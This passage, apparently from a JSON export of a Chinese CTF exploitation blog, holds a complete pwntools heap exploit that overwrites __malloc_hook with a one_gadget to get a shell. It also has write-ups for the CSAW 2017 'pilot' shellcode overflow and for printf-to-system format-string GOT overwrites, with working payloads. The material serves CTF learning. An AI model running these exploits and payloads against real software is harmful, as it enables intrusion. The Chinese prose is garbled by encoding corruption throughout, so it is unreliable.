main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \">> \"\n\n\ndef add(size):\n    sla(menu, \"1\")\n    sla(\"size: \", str(size))\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"index: \", str(idx))\n\ndef edit(idx, con):\n    sla(menu, \"4\")\n    sla(\"index: \", str(idx))\n    sa(\"content: \",con)\n\nadd(0x18)#0\nadd(0x18)#1\ndelete(1)\ndelete(0)\nadd(0x18)\nshow(0)\nru(\"content: \")\nheap_base = u64(rc(6).ljust(8,\"\\x00\"))-0x20\nlog.info(\"heap_base:%x\"%heap_base)\nadd(0x18)#1\nchunk2_addr = heap_base+0x40\nlog.info(\"chunk2_addr:%x\"%chunk2_addr)\n\nadd(0x28) #idx2\nadd(0x28) #idx3\nadd(0x28) #idx4\n\nadd(0x28) #idx5\nadd(0x28) #idx6\nadd(0x18) #idx7\n\nadd(0x28) #idx8\nadd(0x28) #idx9\nadd(0x28) #idx10\nedit(2,\np64(0x0)+p64(0x81) #fakechunk.pre_size,fakechunk.size\n+p64(chunk2_addr+0x10)+p64(chunk2_addr+0x10) #fakechunk.fd,fakechunk.bk\n+p64(0x80)+p64(0x31)) #chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10\n#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;\n\n\nedit(4,p64(0x0)*4+p64(0x80)+p64(0xb0)) #chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10\n#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;\ndelete(5)\nadd(0x18) #5\nedit(2,\"A\"*0x10)\nshow(2)\nru(\"content: \")\nrc(0x10)\nmain_arena = u64(rc(6).ljust(8,\"\\x00\"))-88 -0x100-0x20\nmalloc_hook = main_arena-0x10\nlibc_base = malloc_hook-libc.sym['__malloc_hook']\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + libc.sym[\"system\"] #system\nfree_hook_addr = libc_base + libc.sym[\"__free_hook\"]\nmalloc_hook_addr = libc_base +libc.sym[\"__malloc_hook\"]\ntop_addr_main = main_arena+88\none_gadget = libc_base + 0xf1247\n\n\nlog.info(\"free_hook_addr:0x%x\"%free_hook_addr)\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"main_arena:0x%x\"%main_arena)\nlog.info(\"malloc_hook_addr:0x%x\"%malloc_hook_addr)\nadd(0x28) #11\nedit(11,\"/bin/sh\\x00\")\nadd(0x28) #12\nadd(0x28) #13\nadd(0x28) #14\nadd(0x18) #15\ndelete(7)\nedit(15,p64(0x31))\nadd(0x18)#7\ndelete(4)\nedit(12,p64(main_arena))\nadd(0x28)#4\nadd(0x28)#16\nedit(16,p64(main_arena+0x30)+p64(0x0)\n+p64(0x0)*3+p64(0x31))\nadd(0x28)#17\nedit(17,p64(0x0)*3+p64(malloc_hook_addr-0x10))\npause()\nadd(0x28)#18\nadd(0x28)#19\nedit(19,p64(one_gadget))\npause()\nadd(0x28)\np.interactive()\n```\n\nå…¶å®è¿™æ¬¡æ¯”èµ›ä¹Ÿå­¦åˆ°å¾ˆå¤šï¼Œè™½ç„¶æ¯”èµ›çš„æ—¶å€™ä¸€é“é¢˜ä¹Ÿæ²¡å†™å‡ºæ¥ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯è‡ªå·±çš„ç»éªŒå¤ªå°‘ã€‚\n\n \n","tags":["æ¯”èµ›"],"categories":["PWN"]},{"title":"CSAW Quals CTF 2017-pilot","url":"/2021/08/14/CSAW Quals CTF 2017-pilot/","content":"\n \n\n1.å¸¸è§„checkï¼Œå‘ç°è¿™ç ´ç¨‹åºå•¥ä¿æŠ¤ä¹Ÿæ²¡å¼€ï¼Œè€Œä¸”è¿˜å­˜åœ¨RWXæ®µï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555089.jpeg)\n\nè¿™ä¸çæå˜›ã€‚ä¹‹åIDAæ‰¾æ¼æ´ï¼Œå‘ç°æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf; // [rsp+0h] [rbp-20h]\nif ( read(0, &buf, 0x40uLL) > 4 )ï¼š\n```\n\n2.è¿™é‡Œå°±å¯ä»¥æ€è€ƒä¸‹æ”»å‡»æ€è·¯ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œè¿˜æœ‰RWXæ®µï¼Œè€ƒè™‘ç”¨shellcodeã€‚è™½ç„¶è¿™ä¸ªRWXæ®µæ˜¯éšæœºç”Ÿæˆçš„æ ˆï¼Œåœ°å€æ²¡åŠæ³•ç¡®å®šã€‚å†çœ‹çœ‹ç¨‹åºï¼Œå‘ç°ç¨‹åºè‡ªå·±ç»™æˆ‘ä»¬æ³„éœ²äº†bufçš„æ ˆåœ°å€ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555043.jpeg)\n\nä¹Ÿå°±æ˜¯è¯´ç´§è·Ÿå†locationåé¢çš„æ‰“å°å‡ºæ¥çš„å°±æ˜¯bufçš„çœŸå®æ ˆåœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ¥å—è¯¥æ ˆåœ°å€ï¼Œç„¶åç”¨æ ˆæº¢å‡ºä½¿å¾—æˆ‘ä»¬çš„mainå‡½æ•°è¿”å›æ—¶å¯ä»¥è·³è½¬åˆ°å¯¹åº”çš„bufåœ°å€ä¸Šï¼Œè€Œbufåœ°å€ä¸Šçš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥çš„shellcodeï¼Œè¿™æ ·å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„shellcodeäº†ã€‚\n\n3.ä½†æ˜¯å†™å®Œshellcodeä¼šå‘ç°ç¨‹åºå´©æºƒï¼Œè¿™é‡Œè¿›å…¥IDAè°ƒè¯•ä¸€ä¸‹shellcodeã€‚å¯ä»¥å‘ç°ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼ŒMainå‡½æ•°returnæ‰§è¡Œä¹‹åï¼Œè·³è½¬åˆ°shellcodeçš„åœ°æ–¹ï¼Œç„¶åè¿è¡Œshellcodeã€‚ä½†æ˜¯è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ ˆé¡¶æŒ‡å‘äº†mainå‡½æ•°returnçš„åœ°å€ã€‚æ‰€ä»¥åœ¨è¿è¡Œshellcodeè¿‡ç¨‹ä¸­ï¼Œç”±äºshellcodeä¸­æœ‰ä¸€ä¸ªpush rbxå‘½ä»¤ï¼Œå¯¼è‡´rspå‘ä¸Šç§»åŠ¨8ä¸ªå­—èŠ‚ä¼šè¦†ç›–æ‰shellcodeçš„é¦–åœ°å€ã€‚æœ¬æ¥è¿™æ²¡å•¥äº‹ï¼Œæ¯•ç«Ÿå·²ç»è¿›å…¥åˆ°shellcodeå½“ä¸­å»äº†ï¼Œä½†æ˜¯åé¢è¿˜æœ‰push raxå’Œpush rdiè¿™ä¸¤ä¸ªæ”¹å˜rspçš„å‘½ä»¤ï¼Œè¿™å°±å¯¼è‡´äº†rspå†æ¬¡å‘ä½åœ°å€è¦†ç›–äº†16ä¸ªå­—èŠ‚ï¼Œæ€»å…±è¦†ç›–äº†24ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯æˆ‘ä»¬è¾“å…¥çš„shellcodeæœ‰48ä¸ªå­—èŠ‚ï¼Œé¡ºåºä¸ºshellcode+nop*10+addr_shellcodeï¼Œä¹Ÿå°±æ˜¯æ‰£æ‰æœ€å18ä¸ªå­—èŠ‚ï¼Œè¿˜å¤šå‡ºæ¥6ä¸ªå­—èŠ‚è¦†ç›–æ‰äº†æˆ‘ä»¬çš„æ‰§è¡Œä»£ç shellcodeçš„æœ€å6ä¸ªå­—èŠ‚ä»£ç ï¼Œå¯¼è‡´æˆ‘ä»¬çš„shellcodeæ²¡åŠæ³•å®Œå…¨æ‰§è¡Œï¼Œæœ€ç»ˆå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚\n\n4.ç”±äºreadå‡½æ•°å…è®¸æˆ‘ä»¬è¾“å…¥0x40ï¼Œä¹Ÿå°±æ˜¯64ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯åœ¨è¦†ç›–æ‰è¿”å›åœ°å€ä¹‹åï¼Œæˆ‘ä»¬è¿˜èƒ½å†è¾“å…¥64-48=16ä¸ªå­—èŠ‚ã€‚ç”±äºpush rdiä¹‹åçš„ç‰‡æ®µä¸º8ä¸ªå­—èŠ‚(åŒ…æ‹¬äº†push rdi)ï¼Œå°äº16ä¸ªå­—èŠ‚ï¼Œèƒ½å¤Ÿå®¹çº³ä¸‹æˆ‘ä»¬è¢«è¦†ç›–æ‰çš„shellcodeçš„ä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨æ‹¼æ¥çš„æ–¹å¼æ¥æŠŠshellcodeå®Œç¾æ‰§è¡Œã€‚\n\n5.ç°åœ¨è€ƒè™‘å¦‚ä½•æŠŠä¸¤æ®µshellcodeæ±‡ç¼–ä»£ç è¿åœ¨ä¸€èµ·ã€‚æœ‰call,returnå’Œjmpï¼Œä½†æ˜¯å‰é¢ä¸¤æ¡æŒ‡ä»¤ä¸­ï¼Œcallä¼špushè¿›å‡½æ•°åœ°å€ï¼Œè€Œreturnä¹Ÿä¼šä¿®æ”¹æ ˆå’Œå¯„å­˜å™¨çš„çŠ¶æ€ï¼ŒretæŒ‡ä»¤çš„æœ¬è´¨æ˜¯pop eipï¼Œå³æŠŠå½“å‰æ ˆé¡¶çš„å†…å®¹ä½œä¸ºå†…å­˜åœ°å€è¿›è¡Œè·³è½¬ã€‚æ‰€ä»¥åªèƒ½é€‰æ‹©jmpè·³è½¬ã€‚\n\n6.å¯ä»¥æŸ¥é˜…Intelå¼€å‘è€…æ‰‹å†Œæˆ–å…¶ä»–èµ„æ–™æ‰¾åˆ°jmpå¯¹åº”çš„å­—èŠ‚ç ï¼Œæˆ–è€…è¿™ä¸ªç¨‹åºä¸­å¸¦äº†ä¸€æ¡Jmpå¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚ä¸ºEBï¼Œjmp xæ€»å…±2ä¸ªå­—èŠ‚ï¼šEB x.\n\n7.å°†ä¸¤æ®µéš”å¼€ï¼Œä»push rdiå¼€å§‹ï¼Œå°†push rdiå’Œä¹‹åçš„ä»£ç éƒ½æŒªåˆ°ä¸‹ä¸€ä¸ªåœ°æ–¹ã€‚è¿™æ—¶ç¬¬ä¸€æ®µshellcodeåº”è¯¥æ˜¯22+2(jmp x)=24ä¸ªå­—èŠ‚ï¼Œè·ç¦»ä¸‹æ®µshellcodeçš„è·ç¦»åº”è¯¥æ˜¯48-24=24ï¼Œä¹Ÿå°±å¯¹åº”0x18hï¼Œæ‰€ä»¥æ€»çš„shellcodeåº”è¯¥æ˜¯shellcode1+EB 18h+shellcode2ï¼Œè¿™æ ·å¯ä»¥é¡ºåˆ©æ‰§è¡Œéœ€è¦çš„shellcodeã€‚\n\n \n\n \n\nâ–²jmpçš„è·³è½¬è®¡ç®—è·ç¦»æ˜¯ä»jmpæŒ‡ä»¤ä¸‹ä¸€æ¡å¼€å§‹è®¡ç®—çš„ã€‚\n\nâ–²shellcodeçš„ä¸¤æ®µæ‰§è¡Œï¼š\n\n1.éœ€è¦æ³„éœ²åœ°å€ï¼Œè¯»å–æ³„éœ²åœ°å€ï¼š\n\nA.print io.recvuntil(\"Location:\")#è¯»å–åˆ°å³å°†æ³„éœ²åœ°å€çš„åœ°æ–¹ã€‚\n\nB.shellcode_address_at_stack = int(io.recv()[0:14], 16)#å°†æ³„éœ²å‡ºæ¥çš„åœ°å€è½¬æ¢ä¸ºæ•°å­—æµ\n\nC.log.info(\"Leak stack address = %x\", shellcode_address_at_stack)#å°†æ³„éœ²åœ°å€å°è¯•è¾“å‡ºï¼Œè§‚å¯Ÿæ˜¯å¦æ³„éœ²æˆåŠŸã€‚\n\n2.éœ€è¦è·³è½¬jmpå‘½ä»¤æˆ–è€…æ˜¯return/callï¼Œä½†æ˜¯returnä¼špop eipï¼Œcallä¼špush eipï¼Œéƒ½ä¼šä¿®æ”¹æ‰æ ˆä¸­çš„å†…å®¹ã€‚å¦‚æœshellcodeçš„ä¸¤æ®µæ‰§è¡Œè®¡ç®—åç§»åœ°å€çš„è¯ï¼Œå¯èƒ½éœ€è¦å°†è¿™ä¸¤ä¸ªå†…å®¹ä¹Ÿè®¡ç®—è¿›å…¥ã€‚ä½†æ˜¯jmpå°±ä¸ä¼šéœ€è¦ï¼Œæ˜¯ç›´æ¥æ— æ¡ä»¶è·³è½¬ï¼Œæ‰€ä»¥å¤§å¤šæ—¶å€™é€‰æ‹©jmpæ¯”è¾ƒå¥½ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"Format_x86å’Œformat_x64","url":"/2021/08/14/Format_x86å’Œformat_x64/","content":"\nâ˜…32ä½ç¨‹åºï¼š\n\n1.å¸¸è§„checksecï¼Œåªå¼€äº†NXã€‚æ‰“å¼€IDAæŸ¥æ¼æ´ï¼Œmainå‡½æ•°ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmemset(&buf, 0, 0x12Cu);\nread(0, &buf, 0x12Bu);\nprintf(&buf);\n```\n\n2.è¿™é‡Œä¼šæœ‰ä¸€ä¸ªé‡å¤è¯»å–çš„å¾ªç¯ï¼Œå¼€shelléœ€è¦systemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²ï¼Œè¿™é‡Œåªæœ‰systemå‡½æ•°ï¼Œgotå’Œpltéƒ½å¯¹åº”æœ‰ï¼Œæ²¡æœ‰binshå­—ç¬¦ä¸²ï¼Œæ²¡æœ‰libcã€‚\n\n3.ç”±äºprintfæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å‘æŒ‡å®šçš„å†…å­˜åœ°å€å†™å…¥æŒ‡å®šçš„å†…å®¹ï¼Œè¿™é‡Œè€ƒè™‘å°†printfçš„gotä¸­çš„å€¼æ›´æ”¹systemå‡½æ•°pltè¡¨é¡¹çš„å€¼ã€‚åŸæœ¬å¦‚æœè°ƒç”¨printfå‡½æ•°ï¼Œåˆ™ç›¸å½“äºæ‰§è¡Œprintfå‡½æ•°çš„gotè¡¨ä¸­ä¿å­˜çš„printfå‡½æ•°çš„çœŸå®åœ°å€å¤„çš„ä»£ç ï¼Œæ›´æ”¹ä¹‹åç›¸å½“äºæ‰§è¡Œsystemå‡½æ•°pltè¡¨åœ°å€å¤„çš„ä»£ç ï¼Œä¹Ÿå°±ç›¸å½“äºè°ƒç”¨systemå‡½æ•°ã€‚åŸç†å¦‚ä¸‹ï¼š\n\nåŸæœ¬æ‰§è¡ŒPrintfå‡½æ•°ï¼šç›¸å½“äºæ‰§è¡Œprintfçš„æ‰§è¡Œä»£ç \n\n```\n#æ³¨é‡Šå¤´\n\nprintf_got_addr:   7Fxxxxxx\n7Fxxxxxx:          printfçš„æ‰§è¡Œä»£ç \n```\n\næ›´æ”¹ä¹‹åï¼šç›¸å½“äºæ‰§è¡Œjmp system_gotä»£ç ï¼Œé‚£å°±ç›¸å½“äºæ‰§è¡Œsystemå‡½æ•°äº†\n\n```\n#æ³¨é‡Šå¤´\n\nprintf_got_addr:          08048320(system_plt)\n08048320(system_plt):     jmp system_got\n```\n\n4.é‚£ä¹ˆé¢„æƒ³ç¨‹åºæ€»æµç¨‹å¦‚ä¸‹ï¼šç¬¬ä¸€æ¬¡è¯»å–ï¼Œè¾“å…¥payloadï¼Œç„¶åprintfæ‰§è¡Œï¼Œå°†printfçš„gotè¡¨æ›´æ”¹ä¸ºsystemå‡½æ•°pltè¡¨ã€‚é€šè¿‡whileå¾ªç¯ï¼Œç¬¬äºŒæ¬¡è¯»å–ï¼Œè¾“å…¥binshå­—ç¬¦å­˜å…¥bufä¸­ï¼Œæ­¤æ—¶printf(&buf)ï¼Œç›¸å½“äºsystem(&buf)ï¼Œé‚£å°±ç›¸å½“äºsystem(binsh)ï¼Œå³å¯ç›´æ¥getshellã€‚\n\n5.ç¼–å†™payloadï¼Œé¦–å…ˆéœ€è¦è®¡ç®—ä¸€ä¸‹åç§»åœ°å€ï¼Œå°†æ–­ç‚¹ä¸‹åœ¨call printfä¸Šï¼Œé€šè¿‡è°ƒè¯•èƒ½å¤ŸæŸ¥çœ‹åˆ°printfå†™å…¥æ ˆä¸­çš„åœ°å€è·ç¦»espçš„åç§»é‡ä¸º6ï¼Œæ‰€ä»¥ä½¿ç”¨æ§åˆ¶å­—ç¬¦%næ¥å°†printfåŠ«æŒåˆ°systemï¼Œè¿™é‡Œåç§»å°±ä¼šæˆn-1ä¸º5ã€‚åç§»ä»£è¡¨çš„æ˜¯å–å‚æ•°çš„æ—¶å€™çš„åç§»é‡ï¼Œä¸‹é¢çš„payloadå¯¹åº”çš„5ï¼Œ6ï¼Œ7ï¼Œ8å°±å¯¹åº”å‘åœ°å€print_gotï¼Œprint_got+1ï¼Œprint_got+2ï¼Œprint_got+3å†™å…¥å†…å®¹ã€‚ç”±äºæ˜¯ä¿®æ”¹åœ°å€ï¼Œæ‰€ä»¥ç”¨%hhnæ¥é€ä¸ªä¿®æ”¹ï¼Œé˜²æ­¢å‘æœåŠ¡å™¨å‘é€è¿‡å¤§æ•°æ®ä»è€Œå‡ºé”™ã€‚\n\n(1)æ‰¾åˆ°gotè¡¨å’Œpltè¡¨é¡¹çš„å€¼\n\n```\n#æ³¨é‡Šå¤´\n\nprintf_got = 0x08049778\nsystem_plt = 0x08048320\n```\n\n(2)32ä½ç¨‹åºï¼Œ4ä¸ªå­—èŠ‚ä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥éœ€è¦å››ä¸ªåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = p32(printf_got)\npayload += p32(printf_got+1)\npayload += p32(printf_got+2)\npayload += p32(printf_got+3)\n```\n\n(3)ç”±äºæ˜¯å¤§ç«¯åºï¼Œä½åœ°å€ä¿å­˜çš„æ˜¯é«˜åœ°å€çš„å†…å®¹ï¼Œprint_gotéœ€è¦ä¿å­˜çš„åº”è¯¥æ˜¯system_pltçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯0x20ã€‚\n\nâ‘ ç”±äºå‰é¢å·²ç»è¾“å…¥äº†p32(printf_got)+p32(printf_got1)+p32(printf_got2)+p32(printf_got3)ï¼Œè¿™äº›åœ¨æ²¡æœ‰é‡åˆ°%ä¹‹å‰ä¸€å®šä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œå…±è®¡16ä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘ä»¬éœ€è¦è®©å®ƒæ€»å…±æ‰“å°å‡º0x20ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ‰“å°(0x20-16)ä¸ªå­—èŠ‚ã€‚\n\nâ‘¡åŒæ ·ï¼Œç”±äºå‰é¢å·²ç»æ‰“å°äº†0x20ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬æ€»å…±éœ€è¦æ‰“å°0x83ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åº”è¯¥å†è®©ç¨‹åºæ‰“å°%(0x83-0x20)ä¸ªå­—èŠ‚ï¼Œä¹‹åé“ç†ç›¸åŒã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n\npayload += \"%\"\npayload += str(0x20-16)\npayload += \"c%5$hhn\"\n#å†™å…¥0x20åˆ°åœ°å€print_got\n\npayload += \"%\"\npayload += str(0x83-0x20)\npayload += \"c%6$hhn\"\n#å†™å…¥0x83åˆ°åœ°å€print_got+1\n\npayload += \"%\"\npayload += str(0x104-0x83)\npayload += \"c%7$hhn\"\n#å†™å…¥0x04åˆ°åœ°å€print_got+2ï¼Œ0x104è¢«æˆªæ–­ä¸º04\n\npayload += \"%\"\npayload += str(0x108-0x104)\npayload += \"c%8$hhn\"\n#å†™å…¥0x08åˆ°åœ°å€print_got+3ï¼Œ0x108è¢«æˆªæ–­ä¸º08\n```\n\nâ–²ä¸ºäº†ä¾¿äºç†è§£ï¼Œä¸‹é¢ä»£ç ä¹Ÿè¡Œï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = p32(printf_got+1) \n#ä½¿ç”¨hhnå†™å…¥ï¼Œåˆ†åˆ«å¯¹åº”å¾…å†™å…¥çš„ç¬¬3ï¼Œ4ï¼Œ2ï¼Œ1å­—èŠ‚\npayload += p32(printf_got)\npayload += p32(printf_got+2)\npayload += p32(printf_got+3)\n\npayload += \"%\"\npayload += str(0x83-16) #è¢«å†™å…¥çš„æ•°æ®ï¼Œæ³¨æ„å››ä¸ªåœ°å€é•¿åº¦æ˜¯16ï¼Œéœ€è¦å‡æ‰\npayload += \"c%5$hhn\"\n\npayload += \"%\"\npayload += str(0x120-0x83)\npayload += \"c%6$hhn\"\n\npayload += \"%\"\npayload += str(0x204-0x120) #ç”±äºæ˜¯hhnæ‰€ä»¥ä¼šè¢«æˆªæ–­ï¼Œåªç•™åä¸¤ä½\npayload += \"c%7$hhn\"\n\npayload += \"%\"\npayload += str(0x208-0x204)\npayload += \"c%8$hhn\"\n```\n\n6.å…¶å®å¯ä»¥ç›´æ¥ä½¿ç”¨ç±»Fmtstrï¼Œæ•ˆæœä¸€æ ·ï¼Œå°†Payloadæ›¿æ¢æˆä¸‹åˆ—ä»£ç å³å¯\n\npayload = fmtstr_payload(5, {printf_got:system_plt})\n\n7.ä¹‹åå†io.sendline('/bin/sh\\x00')ï¼Œå³å¯getshell\n\n \n\nâ˜…64ä½ç¨‹åº\n\n1.ç”±äº64ä½ï¼Œä¼ å‚çš„é¡ºåºä¸ºrdi, rsi, rdx, rcx, r8, r9ï¼Œæ¥ä¸‹æ¥æ‰æ˜¯æ ˆï¼Œæ‰€ä»¥åç§»é‡åº”è¯¥æ˜¯6æŒ‡å‘æ ˆé¡¶ã€‚ä¹‹åè€ƒè™‘ä½¿ç”¨fmtstræ¥ç›´æ¥æ„é€ è·å–ï¼š\n\npayload = fmtstr_payload(6, {printf_got:system_plt})\n\nä½†æ˜¯è¿™ä¸ªæ–¹æ³•ä¼šå‡ºé”™ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„åœ°å€å¦‚ä¸‹\n\n```\n#æ³¨é‡Šå¤´\n\nprintf_got = 0x00601020\nsystem_plt = 0x00400460\n```\n\néœ€è¦å†™å…¥åœ°å€printf_gotçš„é¦–ä¸¤ä½æ˜¯00ï¼Œä¸”ä»¥p64å½¢å¼å‘é€ï¼Œæ‰€ä»¥å…ˆå‘é€çš„æ˜¯0x20ï¼Œ0x10ï¼Œ0x60ï¼Œ0x00ï¼Œ0x00.......è€ŒReadå‡½æ•°è¯»åˆ°0x00å°±ä¼šæˆªæ–­ï¼Œé»˜è®¤è¿™æ˜¯å­—ç¬¦ä¸²ç»“æŸäº†ï¼Œæ‰€ä»¥ä¹‹åçš„éƒ½æ— æ•ˆäº†ã€‚\n\n2.é‚£ä¹ˆè€ƒè™‘æ‰‹åŠ¨æ–¹å¼ï¼Œå°†p64(printf_got)æ”¾åœ¨payloadçš„æœ«å°¾ï¼Œè¿™æ ·å°±åªæœ‰æœ€åæ‰ä¼šè¯»åˆ°0x00ï¼Œå…¶å®ƒçš„æœ‰æ•ˆæ•°æ®éƒ½èƒ½è¯»å…¥ã€‚\n\n3.ä½¿ç”¨æ‰‹åŠ¨æ–¹å¼å°±éœ€è¦å†æ¬¡è®¡ç®—åç§»é‡ï¼Œæˆ‘ä»¬çš„payloadæ„æˆåº”è¯¥æ˜¯\n\npayload = â€%â€+str(system_plt)+â€c%8$llnâ€ + p64(printf_got)\n\nè¿™é‡Œåç§»é‡ä¸º8æ˜¯å› ä¸ºç»è¿‡è°ƒè¯•å‘ç°æˆ‘ä»¬çš„è¾“å…¥ä»æ ˆé¡¶å¼€å§‹è®¡ç®—ï¼Œä¹Ÿå°±æ˜¯ä»æ ˆé¡¶å¼€å§‹ï¼Œä¸€å…±è¾“å…¥äº†\n\n1(%) + 7(0x400460è½¬æ¢æˆåè¿›åˆ¶ä¸º4195424ï¼Œä¹Ÿå°±æ˜¯7ä¸ªå­—èŠ‚) + 7(â€œc%8$llnâ€) + 8(p64_printf_got)=23ä¸ªå­—èŠ‚ã€‚\n\nç»è¿‡è®¡ç®—æˆ‘ä»¬å‘ç°ï¼Œp64å‰é¢çš„å­—èŠ‚æ•°ä¸º15ä¸ªå­—èŠ‚ï¼Œä¸è¶³8çš„å€æ•°ï¼Œè¿™æ ·ä¼šå¯¼è‡´printf_gotçš„æœ€åä¸€ä¸ªå­—èŠ‚20è¢«æˆªæ–­è‡³åç§»é‡ä¸º7çš„ä½ç½®ï¼Œä»è€Œä½¿å¾—åç§»é‡ä¸º8çš„ä½ç½®åªæœ‰6010ï¼Œå¯¼è‡´å‡ºé”™ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¡«å……ä¸€ä¸ªå­—èŠ‚è¿›å»ï¼Œè®©å®ƒä¸ä¼šè¢«æˆªæ–­ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191543645.png)\n\n```\n#æ³¨é‡Šå¤´\n\npayload = â€a%â€ + str(system_plt-1)+â€c%8$llnâ€ + p64(printf_got)\n```\n\nåŠ å…¥ä¸€ä¸ªå­—èŠ‚aå°±å¯ä»¥ä½¿å¾—åœ¨å‚æ•°åç§»é‡ä¸º6å’Œ7çš„ä½ç½®ä¸­ä¸ä¼šæˆªæ–­0x601020ã€‚åŒæ—¶åŠ å…¥å­—èŠ‚aå°±è¦ä½¿system_plt-1æ¥æ»¡è¶³æœ€ç»ˆæ‰“å°çš„å­—ç¬¦ä¸ªæ•°ä¸º0x00400460ï¼Œä»è€Œæ‰èƒ½æˆåŠŸå°†0x00400460(system_plt)å†™å…¥åˆ°0x00601020(printf_got)\n\n5.å®Œæˆpayloadä¹‹åï¼Œå†æ¬¡å¾ªç¯è¿›å…¥ï¼Œè¾“å…¥io.sendline('/bin/sh\\x00')åinteractive()å³å¯getshell\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"HCTF2018_the_end","url":"/2021/08/14/HCTF2018_the_end/","content":"\n1.å¸¸è§„checksecï¼Œé™¤äº†canaryä¹‹å¤–ä¿æŠ¤å…¨å¼€ã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œæ²¡ä»€ä¹ˆæ¼æ´ï¼Œå°±æ˜¯ç¨‹åºä¼šæ³„éœ²å‡ºsleepçš„åœ°å€ï¼Œç„¶åè®©æˆ‘ä»¬åœ¨ä»»æ„åœ°æ–¹å†™å…¥5ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”ç»™äº†libcæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç®—å‡ºlibcåŸºåœ°å€ï¼Œç‰ˆæœ¬ä¸º2.23ã€‚\n\nprintf(\"here is a gift %p, good luck ;)\\n\", &sleep);\n\n2.ç¨‹åºæœ€åè°ƒç”¨exit(1337)ï¼Œä¸¤ç§æ–¹æ³•ï¼š\n\n(1)exitä¼šæ— 